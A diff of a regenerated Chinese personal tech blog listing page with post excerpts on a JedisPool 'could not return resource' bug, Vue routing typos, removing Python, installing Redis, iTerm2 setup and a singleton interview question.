@@ -98,7 +98,6 @@
 <meta property="og:url" content="https://amosannn.github.io/page/2/index.html">
 <meta property="og:site_name" content="Amosannn">
 <meta property="og:description" content="start from zero">
-<meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Amosannn">
 <meta name="twitter:description" content="start from zero">
@@ -305,6 +304,535 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2018/01/30/jedispool-could-not-return-resource-error/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Amosannn">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/16012509?v=3&u=6fe0dd08943216aeff2d3c9d1b8c3e602f6de8e9&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Amosannn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/01/30/jedispool-could-not-return-resource-error/" itemprop="url">JedisPool报错：Could not return the resource to the pool</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-30T15:08:45+08:00">
+                2018-01-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/01/30/jedispool-could-not-return-resource-error/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/01/30/jedispool-could-not-return-resource-error/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Bug的起源和解法"><a href="#Bug的起源和解法" class="headerlink" title="Bug的起源和解法"></a>Bug的起源和解法</h1><p>这个错误来的实在猝不及防，第一次请求可以成功使用<code>JedisPool</code>，而第二次请求便会报错，在翻遍了所有相关博客后一度以为是自己的配置出了错，于是不断修改配置文件中的redis连接池参数。<br>折腾老半天之后，没有帮助TAT<br>这时，我想起10年前的某个午后，蝉鸣的空气中传来的几分安定，出神地趴在窗边看麻雀扑腾的我，被一声厉呵带回现实。之后便到了标准环节–”下课到办公室找我”。之后的事情便记不太清了，只是我深深地记得当时的心境，想不出的问题换个角度想，一定会有不同的发现。<br>那就回归报错吧，“无法将资源返回到池”，再回想到我的jedisPool对象，旷的一声，仿佛天旋地转一般，一切的一切突然都变透彻了。</p>
+<h2 id="错误根源及出错原因"><a href="#错误根源及出错原因" class="headerlink" title="错误根源及出错原因"></a>错误根源及出错原因</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">followUser</span><span class="params">(Integer localUserId, Integer userId)</span> </span>&#123;</div><div class="line">  <span class="keyword">try</span> (Jedis jedis = jedisPool.getResource()) &#123;</div><div class="line">    jedis.zadd(localUserId + RedisKey.FOLLOW_USER, System.currentTimeMillis(),</div><div class="line">        String.valueOf(userId));</div><div class="line">    jedis.zadd(userId + RedisKey.FOLLOWED_USER, System.currentTimeMillis(),</div><div class="line">        String.valueOf(localUserId));</div><div class="line">  &#125; <span class="keyword">catch</span> (JedisException e) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">  &#125;</div><div class="line">  jedisPool.close();<span class="comment">// 问题就出在这里</span></div><div class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>JedisPool在configuration类中初始化（项目启动时有spring自动扫描）<br>然而在每个业务类调用完之后就被手动关闭，自然执行完第一次后就不再能取出resource的，也无法return。<br>解决这个bug只需把每个service实现类中的<code>jedisPool.close()</code>删去即可。</p>
+<h2 id="为什么会出现这种写法"><a href="#为什么会出现这种写法" class="headerlink" title="为什么会出现这种写法"></a>为什么会出现这种写法</h2><p>说到这个就不得不提起Jedis的wiki<br>官方po出的demo是这样使用jedis的：  </p>
+<h3 id="首先引入pom"><a href="#首先引入pom" class="headerlink" title="首先引入pom"></a>首先引入pom</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;dependency&gt;</div><div class="line">    &lt;groupId&gt;redis.clients&lt;/groupId&gt;</div><div class="line">    &lt;artifactId&gt;jedis&lt;/artifactId&gt;</div><div class="line">    &lt;version&gt;2.9.0&lt;/version&gt;</div><div class="line">    &lt;type&gt;jar&lt;/type&gt;</div><div class="line">    &lt;scope&gt;compile&lt;/scope&gt;</div><div class="line">&lt;/dependency&gt;</div></pre></td></tr></table></figure>
+<h3 id="然后实例化JedisPool"><a href="#然后实例化JedisPool" class="headerlink" title="然后实例化JedisPool"></a>然后实例化JedisPool</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">JedisPool pool = <span class="keyword">new</span> JedisPool(<span class="keyword">new</span> JedisPoolConfig(), <span class="string">"localhost"</span>);</div></pre></td></tr></table></figure>
+<h3 id="接着实例化jedis有两种方法"><a href="#接着实例化jedis有两种方法" class="headerlink" title="接着实例化jedis有两种方法"></a>接着实例化jedis有两种方法</h3><ol>
+<li><p>try-with-resource法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/// Jedis implements Closeable. Hence, the jedis instance will be auto-closed after the last statement.</span></div><div class="line"><span class="keyword">try</span> (Jedis jedis = pool.getResource()) &#123;</div><div class="line">  <span class="comment">/// ... do stuff here ... for example</span></div><div class="line">  jedis.set(<span class="string">"foo"</span>, <span class="string">"bar"</span>);</div><div class="line">  String foobar = jedis.get(<span class="string">"foo"</span>);</div><div class="line">  jedis.zadd(<span class="string">"sose"</span>, <span class="number">0</span>, <span class="string">"car"</span>); jedis.zadd(<span class="string">"sose"</span>, <span class="number">0</span>, <span class="string">"bike"</span>); </div><div class="line">  Set&lt;String&gt; sose = jedis.zrange(<span class="string">"sose"</span>, <span class="number">0</span>, -<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment">/// ... when closing your application:</span></div><div class="line">pool.close();<span class="comment">// 这便是原罪</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>手动关闭jedis法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Jedis jedis = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">  jedis = pool.getResource();</div><div class="line">  <span class="comment">/// ... do stuff here ... for example</span></div><div class="line">  jedis.set(<span class="string">"foo"</span>, <span class="string">"bar"</span>);</div><div class="line">  String foobar = jedis.get(<span class="string">"foo"</span>);</div><div class="line">  jedis.zadd(<span class="string">"sose"</span>, <span class="number">0</span>, <span class="string">"car"</span>); jedis.zadd(<span class="string">"sose"</span>, <span class="number">0</span>, <span class="string">"bike"</span>); </div><div class="line">  Set&lt;String&gt; sose = jedis.zrange(<span class="string">"sose"</span>, <span class="number">0</span>, -<span class="number">1</span>);</div><div class="line">&#125; <span class="keyword">finally</span> &#123;</div><div class="line">  <span class="comment">// You have to close jedis object. If you don't close then</span></div><div class="line">  <span class="comment">// it doesn't release back to pool and you can't get a new</span></div><div class="line">  <span class="comment">// resource from pool.</span></div><div class="line">  <span class="keyword">if</span> (jedis != <span class="keyword">null</span>) &#123;</div><div class="line">    jedis.close();</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">/// ... when closing your application:</span></div><div class="line">pool.close();</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>虽然不在报错了，但是现在不关的话又不知道在哪能关的了它了。。。</p>
+<hr>
+<p>双手奉上： <a href="https://github.com/xetorthio/jedis/wiki/Getting-started" target="_blank" rel="external">Jedis官方指引</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2018/01/24/vue-error-collection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Amosannn">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/16012509?v=3&u=6fe0dd08943216aeff2d3c9d1b8c3e602f6de8e9&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Amosannn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/01/24/vue-error-collection/" itemprop="url">Vue开发路上遇到的坑儿们</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-24T10:52:06+08:00">
+                2018-01-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/01/24/vue-error-collection/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/01/24/vue-error-collection/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h1><p>此文仅用于记录vue开发中遇到的各种奇葩事。</p>
+<h1 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h1><h2 id="项目不报错但是路由不加载"><a href="#项目不报错但是路由不加载" class="headerlink" title="项目不报错但是路由不加载"></a>项目不报错但是路由不加载</h2><p>前方预警：这是个低级错误Orz<br>index.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">routes: [</div><div class="line">    &#123;</div><div class="line">      path: &apos;/&apos;,</div><div class="line">      name: &apos;Index&apos;,</div><div class="line">      component: &#123;</div><div class="line">        nav: Navv,</div><div class="line">        main: Index,</div><div class="line">        footer: Footter</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">]</div></pre></td></tr></table></figure></p>
+<p>App.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;template&gt;</div><div class="line">  &lt;div id=&quot;app&quot;&gt;</div><div class="line">    &lt;router-view name=&quot;nav&quot;&gt;&lt;/router-view&gt;</div><div class="line">    &lt;router-view name=&quot;main&quot;&gt;&lt;/router-view&gt;</div><div class="line">    &lt;router-view name=&quot;footer&quot;&gt;&lt;/router-view&gt;</div><div class="line">  &lt;/div&gt;</div><div class="line">&lt;/template&gt;</div></pre></td></tr></table></figure></p>
+<p>如果你和我一样是只小白菜，可能咋一看会发现没什么毛病，仔细一看就会发现路由配置里的<code>components</code>被我写成了·component·。。<br>vue中到目前为止我知道的两种路由配置方式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">// 第一种</div><div class="line">...</div><div class="line">component: navv</div><div class="line">...</div><div class="line">// 第二种</div><div class="line">components: &#123;</div><div class="line">	navv</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>over, 经验值 +1</p>
+<h2 id="Failed-to-execute-‘setAttribute’-on-‘Element’-‘method-’-is-not-a-valid-attribute-name"><a href="#Failed-to-execute-‘setAttribute’-on-‘Element’-‘method-’-is-not-a-valid-attribute-name" class="headerlink" title="Failed to execute ‘setAttribute’ on ‘Element’: ‘method+’ is not a valid attribute name."></a>Failed to execute ‘setAttribute’ on ‘Element’: ‘method+’ is not a valid attribute name.</h2><p>由于项目中引入了饿了么开发的组件库·element-ui·，所以一度以为是和我引入的css文件起了冲突？？甚至我还去执行了<code>npm uninstall element-ui</code>这条命令。最后实在没办法了，一段一段代码排查问题，找到一个诡异的地方。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;/listTopic&quot; method+=&quot;post&quot;&gt;</div><div class="line">  &lt;input name=&quot;topicName&quot; type=&quot;text&quot; class=&quot;search-input&quot; placeholder=&quot;搜索你感兴趣的内容...&quot;&gt;</div><div class="line">  &lt;button type=&quot;submit&quot; class=&quot;search-button&quot;&gt;&lt;i class=&quot;sprite-search&quot;&gt;&lt;/i&gt;&lt;/button&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure></p>
+<p>噗。。form标签下的method方法多了个+号。。。想拿头去撞豆腐了。<br>ok，经验值 +1</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2017/12/24/remove-your-own-python/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Amosannn">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/16012509?v=3&u=6fe0dd08943216aeff2d3c9d1b8c3e602f6de8e9&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Amosannn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/24/remove-your-own-python/" itemprop="url">如何删除自己安装的python(干净、无残留)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-24T21:27:15+08:00">
+                2017-12-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/12/24/remove-your-own-python/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/12/24/remove-your-own-python/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>最近又折腾起了python，于是发现很久以前的自己在各个地方留下了python的足迹，简直就是个更新日志。。<br>既然习惯了brew这个管家，那就把以前的坑都填好吧！</p>
+<p>安装软件的时候很快活，卸载的时候就难受的不行，不熟悉系统目录，你就根本卸不干净。<br>当然市面上有很多pkg卸载软件，但是强迫症的自己总觉得它卸不干净~。~</p>
+<p>搜了一票国内论坛。。还是跑去StackOverFlow，找到了一个靠谱回答。<br>答主提供了python官网的反馈页面，是一位不知如何完整卸载python的网友提交的反馈。<br>一个叫<code>Ned Deily</code>的朋友提取了安装目录并将其制成卸载脚本（详情见参考链接）<br>知道了该删哪就可以动手了…</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/12/24/remove-your-own-python/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2017/11/29/redis-install/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Amosannn">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/16012509?v=3&u=6fe0dd08943216aeff2d3c9d1b8c3e602f6de8e9&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Amosannn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/11/29/redis-install/" itemprop="url">Redis从安装到踩坑</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-29T16:13:02+08:00">
+                2017-11-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/11/29/redis-install/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/11/29/redis-install/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>先贴Redis官网：<a href="https://redis.io/download" target="_blank" rel="external">https://redis.io/download</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ wget http://download.redis.io/releases/redis-4.0.2.tar.gz</div><div class="line">$ tar xzf redis-4.0.2.tar.gz</div><div class="line">$ cd redis-4.0.2</div><div class="line">$ make</div></pre></td></tr></table></figure>
+<p>如果没有安装gcc，则会抛出这样的错误：<br><img src="/images/redis_install/redis_install_error.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ yum install gcc</div></pre></td></tr></table></figure></p>
+<p>在执行一次make可能会再抛出这样一个错误：<br><img src="/images/redis_install/redis_install_error2.png" alt=""></p>
+<p>这样的话便在make后加上参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ make MALLOC=libc</div></pre></td></tr></table></figure></p>
+<p>编译完成后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ src/redis-server  redis.conf</div></pre></td></tr></table></figure></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/11/29/redis-install/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2017/11/05/intalled-item2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -384,10 +912,10 @@
       
         
           <p>一直听说item2是个比terminal强大的终端工具，为了提升命令行的体验，从teminal切换到了item2。</p>
-<h2 id="下载Item2"><a href="#下载Item2" class="headerlink" title="下载Item2"></a>下载Item2</h2><p><a href="https://www.iterm2.com/downloads.html" target="_blank" rel="noopener">https://www.iterm2.com/downloads.html</a></p>
+<h2 id="下载Item2"><a href="#下载Item2" class="headerlink" title="下载Item2"></a>下载Item2</h2><p><a href="https://www.iterm2.com/downloads.html" target="_blank" rel="external">https://www.iterm2.com/downloads.html</a></p>
 <h2 id="设置开启快捷键"><a href="#设置开启快捷键" class="headerlink" title="设置开启快捷键"></a>设置开启快捷键</h2><p>前提是item2在后台运行<br>-&gt; 进入preference(command ,)<br>-&gt; keys<br>-&gt; Hotkeys(左下角) 勾选<code>Show/hide iTerm2 with a system-wide hotkey</code><br>然后就按喜好设置快捷键啦</p>
-<h2 id="配色方案"><a href="#配色方案" class="headerlink" title="配色方案"></a>配色方案</h2><p>可以自定终端背景色或导入现成的配色方案，比如<a href="http://ethanschoonover.com/solarized" target="_blank" rel="noopener">Solarized</a><br>跳到Download下载后选择相应的文件导入<br><img src="/images/item2-solarized-setting.png" alt=""><br>你可以选择双击’.itermcolors‘文件或在preference -&gt; profiles -&gt; colors -&gt; Color Presets（右下角）-&gt; import… 中导入</p>
-<h2 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h2><p>osx中默认zsh为4.0版本，可直接切换使用或下载最新的5.0版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install zsh</span><br></pre></td></tr></table></figure></p>
+<h2 id="配色方案"><a href="#配色方案" class="headerlink" title="配色方案"></a>配色方案</h2><p>可以自定终端背景色或导入现成的配色方案，比如<a href="http://ethanschoonover.com/solarized" target="_blank" rel="external">Solarized</a><br>跳到Download下载后选择相应的文件导入<br><img src="/images/item2-solarized-setting.png" alt=""><br>你可以选择双击’.itermcolors‘文件或在preference -&gt; profiles -&gt; colors -&gt; Color Presets（右下角）-&gt; import… 中导入</p>
+<h2 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h2><p>osx中默认zsh为4.0版本，可直接切换使用或下载最新的5.0版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install zsh</div></pre></td></tr></table></figure></p>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2017/11/05/intalled-item2/#more" rel="contents">
@@ -691,14 +1219,14 @@
         
           
             <p>记得前阵子面试金山时碰到了这样一个问题</p>
-<p>1）下面哪一种写法更好，为什么？<br>2）请写出另一种单例模式。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (singleton == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton singleton;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (singleton == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (singleton == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>1）下面哪一种写法更好，为什么？<br>2）请写出另一种单例模式。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (singleton == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</div><div class="line">                singleton = <span class="keyword">new</span> Singleton();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> singleton;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
